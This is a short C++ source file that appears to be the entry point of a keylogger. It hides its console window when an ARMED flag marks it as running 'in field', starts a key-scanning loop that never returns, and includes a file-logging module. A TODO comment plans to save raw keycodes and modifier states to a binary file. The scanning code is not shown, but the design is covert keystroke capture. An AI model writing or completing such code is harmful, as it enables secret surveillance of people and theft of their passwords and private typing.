#include "pch.h"

#include "log/logFILE/file.h"
#include "keyscan/keyscan.h"

int main() {
	//if running in field hide console
	if (ARMED) FreeConsole();
	//scanning from hereon
	keyscan scanner;
	scanner.scan();
	//will never be reached
	return 1;
}

//TODO: transfer character interpretation to standalone program, saving only keycode and pressed modifiers to binary file